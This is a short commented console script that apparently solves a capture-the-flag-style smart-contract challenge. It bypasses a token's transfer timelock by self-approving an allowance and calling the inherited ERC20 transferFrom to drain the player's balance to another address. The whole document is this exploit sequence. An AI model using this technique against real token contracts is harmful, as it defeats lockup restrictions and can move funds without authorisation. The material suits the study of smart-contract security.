//utilize TransferFrom to bypass modifier on transfer function in contract

//functions available to contract inheriting from ERC20
await contract.abi

//get balance initialized at contructor and create variable
let _amt = (await contract.balanceOf(player)).toString()

//check for allowance assigner from/tp player
await contract.allowance(player, player)

//approve allowance for player
await contract.approve(player, _amt)

//recheck allowance and confirm amount
(await contract.allowance(player, player)).toString()

//assign eth address to variable (created new address in metamask)
let send_to = '0x...'

//utilize transferFrom, bypassing transfer contract with modifier 
await contract.transferFrom(player, send_to, _amt)

//confirm balance now zero
(await contract.balanceOf(player)).toString()

//send tokens back to original address :)
